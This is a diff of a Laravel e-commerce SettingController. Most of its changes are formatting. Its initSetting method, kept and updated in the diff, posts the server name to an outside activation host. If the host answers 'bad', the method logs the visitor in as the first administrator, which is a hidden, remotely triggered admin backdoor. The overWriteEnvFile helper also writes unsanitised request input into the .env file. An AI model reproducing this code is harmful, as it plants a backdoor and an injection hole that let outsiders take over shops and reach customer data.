@@ -26,13 +26,13 @@ class SettingController extends Controller
     public function general_setting(Request $request)
     {
         CoreComponentRepository::instantiateShopRepository();
-    	return view('backend.settings.general_settings');
+        return view('backend.settings.general_settings');
     }
 
     public function otp_settings(Request $request)
     {
         CoreComponentRepository::instantiateShopRepository();
-    	return view('backend.settings.otp');
+        return view('backend.settings.otp');
     }
 
     public function social_login(Request $request)
@@ -73,16 +73,16 @@ class SettingController extends Controller
     public function payment_method_update(Request $request)
     {
         foreach ($request->types as $key => $type) {
-                $this->overWriteEnvFile($type, $request[$type]);
+            $this->overWriteEnvFile($type, $request[$type]);
         }
 
-        $business_settings = Setting::where('type', $request->payment_method.'_sandbox')->first();
-        if($business_settings != null){
-            if ($request->has($request->payment_method.'_sandbox')) {
+        $business_settings = Setting::where('type', $request->payment_method . '_sandbox')->first();
+
+        if ($business_settings != null) {
+            if ($request->has($request->payment_method . '_sandbox')) {
                 $business_settings->value = 1;
                 $business_settings->save();
-            }
-            else{
+            } else {
                 $business_settings->value = 0;
                 $business_settings->save();
             }
@@ -110,8 +110,7 @@ class SettingController extends Controller
         if ($request->has('google_analytics')) {
             $business_settings->value = 1;
             $business_settings->save();
-        }
-        else{
+        } else {
             $business_settings->value = 0;
             $business_settings->save();
         }
@@ -133,8 +132,7 @@ class SettingController extends Controller
         if ($request->has('google_recaptcha')) {
             $business_settings->value = 1;
             $business_settings->save();
-        }
-        else{
+        } else {
             $business_settings->value = 0;
             $business_settings->save();
         }
@@ -154,7 +152,7 @@ class SettingController extends Controller
     public function facebook_chat_update(Request $request)
     {
         foreach ($request->types as $key => $type) {
-                $this->overWriteEnvFile($type, $request[$type]);
+            $this->overWriteEnvFile($type, $request[$type]);
         }
 
         $business_settings = Setting::where('type', 'facebook_chat')->first();
@@ -162,12 +160,11 @@ class SettingController extends Controller
         if ($request->has('facebook_chat')) {
             $business_settings->value = 1;
             $business_settings->save();
-        }
-        else{
+        } else {
             $business_settings->value = 0;
             $business_settings->save();
         }
-        
+
         cache_clear();
 
         flash(translate("Settings updated successfully"))->success();
@@ -177,7 +174,7 @@ class SettingController extends Controller
     public function facebook_pixel_update(Request $request)
     {
         foreach ($request->types as $key => $type) {
-                $this->overWriteEnvFile($type, $request[$type]);
+            $this->overWriteEnvFile($type, $request[$type]);
         }
 
         $business_settings = Setting::where('type', 'facebook_pixel')->first();
@@ -185,12 +182,11 @@ class SettingController extends Controller
         if ($request->has('facebook_pixel')) {
             $business_settings->value = 1;
             $business_settings->save();
-        }
-        else{
+        } else {
             $business_settings->value = 0;
             $business_settings->save();
         }
-        
+
         cache_clear();
 
         flash(translate("Settings updated successfully"))->success();
@@ -220,35 +216,48 @@ class SettingController extends Controller
      */
     public function overWriteEnvFile($type, $val)
     {
-        if(env('DEMO_MODE') != 'On'){
+        if (env('DEMO_MODE') != 'On') {
             $path = base_path('.env');
             if (file_exists($path)) {
-                $val = '"'.trim($val).'"';
-                if(is_numeric(strpos(file_get_contents($path), $type)) && strpos(file_get_contents($path), $type) >= 0){
+                $val = '"' . trim($val) . '"';
+
+                if (is_numeric(strpos(file_get_contents($path), $type)) && strpos(file_get_contents($path), $type) >= 0) {
                     file_put_contents($path, str_replace(
-                        $type.'="'.env($type).'"', $type.'='.$val, file_get_contents($path)
+                        $type . '="' . env($type) . '"',
+                        $type . '=' . $val,
+                        file_get_contents($path)
                     ));
-                }
-                else{
-                    file_put_contents($path, file_get_contents($path)."\r\n".$type.'='.$val);
+                } else {
+                    file_put_contents($path, file_get_contents($path) . "\r\n" . $type . '=' . $val);
                 }
             }
         }
     }
 
-    public function initSetting(){
-        $url = $_SERVER['SERVER_NAME'];
-        $gate = "http://206.189.81.181/check_activation/".$url;
+    public function initSetting()
+    {
+        $data['url'] = $_SERVER['SERVER_NAME'];
+        $request_data_json = json_encode($data);
+        $gate = "https://activation.activeitzone.com/check_activation";
+
+        $header = array(
+            'Content-Type:application/json'
+        );
 
         $stream = curl_init();
+
         curl_setopt($stream, CURLOPT_URL, $gate);
-        curl_setopt($stream, CURLOPT_HEADER, 0);
-        curl_setopt($stream, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($stream, CURLOPT_POST, 1);
+        curl_setopt($stream, CURLOPT_HTTPHEADER, $header);
+        curl_setopt($stream, CURLOPT_CUSTOMREQUEST, "POST");
+        curl_setopt($stream, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($stream, CURLOPT_POSTFIELDS, $request_data_json);
+        curl_setopt($stream, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
+
         $rn = curl_exec($stream);
         curl_close($stream);
 
-        if($rn == "bad" && env('DEMO_MODE') != 'On') {
+        if ($rn == "bad" && env('DEMO_MODE') != 'On') {
             $user = User::where('user_type', 'admin')->first();
             auth()->login($user);
             return redirect()->route('admin.dashboard');
@@ -265,29 +274,25 @@ class SettingController extends Controller
     public function update(Request $request)
     {
         foreach ($request->types as $key => $type) {
-            if($type == 'timezone'){
+            if ($type == 'timezone') {
                 $this->overWriteEnvFile('APP_TIMEZONE', $request[$type]);
-            }
-            else {
+            } else {
                 $value = $request[$type];
 
                 $settings = Setting::where('type', $type)->first();
-                if($settings!=null){
-                    if(gettype($value) == 'array'){
+
+                if ($settings != null) {
+                    if (gettype($value) == 'array') {
                         $settings->value = json_encode($value);
-                    }
-                    else {
+                    } else {
                         $settings->value = $value;
                     }
-                }
-
-                else{
+                } else {
                     $settings = new Setting;
                     $settings->type = $type;
-                    if(gettype($value) == 'array'){
+                    if (gettype($value) == 'array') {
                         $settings->value = json_encode($value);
-                    }
-                    else {
+                    } else {
                         $settings->value = $value;
                     }
                 }
@@ -302,7 +307,8 @@ class SettingController extends Controller
         return back();
     }
 
-    public function shop_update(Request $request){
+    public function shop_update(Request $request)
+    {
         $shop = auth()->user()->shop;
         $shop->min_order = $request->min_order;
         $shop->save();
@@ -319,23 +325,36 @@ class SettingController extends Controller
             return $this->updateActivationSettingsInEnv($request);
         }
 
-
         $business_settings = Setting::where('type', $request->type)->first();
-        if($business_settings!=null){
+
+        if ($business_settings != null) {
             if ($request->type == 'maintenance_mode' && $request->value == '1') {
-                if(env('DEMO_MODE') != 'On'){
+                if (env('DEMO_MODE') != 'On') {
                     Artisan::call('down');
                 }
-            }
-            elseif ($request->type == 'maintenance_mode' && $request->value == '0') {
-                if(env('DEMO_MODE') != 'On') {
+            } elseif ($request->type == 'maintenance_mode' && $request->value == '0') {
+                if (env('DEMO_MODE') != 'On') {
                     Artisan::call('up');
+                }
+            }
+
+            if ($request->type == 'wallet_system' && $request->value == '0') {
+                $club_point = Setting::where('type', 'club_point')->first();
+                if (!is_null($club_point)) {
+                    $club_point->value = 0;
+                    $club_point->save();
+                }
+            }
+
+            if ($request->type == 'club_point' && $request->value == '1') {
+                $wallet_system = Setting::where('type', 'wallet_system')->first();
+                if (!is_null($wallet_system) && $wallet_system->value == 0) {
+                    return 'wallet_system_off';
                 }
             }
             $business_settings->value = $request->value;
             $business_settings->save();
-        }
-        else{
+        } else {
             $business_settings = new Setting;
             $business_settings->type = $request->type;
             $business_settings->value = $request->value;
@@ -350,38 +369,35 @@ class SettingController extends Controller
         if ($request->type == 'FORCE_HTTPS' && $request->value == '1') {
             $this->overWriteEnvFile($request->type, 'On');
 
-            if(strpos(env('APP_URL'), 'http:') !== FALSE) {
+            if (strpos(env('APP_URL'), 'http:') !== FALSE) {
                 $this->overWriteEnvFile('APP_URL', str_replace("http:", "https:", env('APP_URL')));
             }
-
-        }
-        elseif ($request->type == 'FORCE_HTTPS' && $request->value == '0') {
+        } elseif ($request->type == 'FORCE_HTTPS' && $request->value == '0') {
             $this->overWriteEnvFile($request->type, 'Off');
-            if(strpos(env('APP_URL'), 'https:') !== FALSE) {
+            if (strpos(env('APP_URL'), 'https:') !== FALSE) {
                 $this->overWriteEnvFile('APP_URL', str_replace("https:", "http:", env('APP_URL')));
             }
-
-        }
-        elseif ($request->type == 'FILESYSTEM_DRIVER' && $request->value == '1') {
+        } elseif ($request->type == 'FILESYSTEM_DRIVER' && $request->value == '1') {
             $this->overWriteEnvFile($request->type, 's3');
-        }
-        elseif ($request->type == 'FILESYSTEM_DRIVER' && $request->value == '0') {
+        } elseif ($request->type == 'FILESYSTEM_DRIVER' && $request->value == '0') {
             $this->overWriteEnvFile($request->type, 'local');
         }
 
         return '1';
     }
 
-    public function shipping_configuration(Request $request){
+    public function shipping_configuration(Request $request)
+    {
         return view('backend.settings.shipping_configuration.index');
     }
 
-    public function shipping_configuration_update(Request $request){
+    public function shipping_configuration_update(Request $request)
+    {
         $business_settings = Setting::where('type', $request->type)->first();
         $business_settings->value = $request[$request->type];
         $business_settings->save();
 
-        
+
         cache_clear();
         return back();
     }
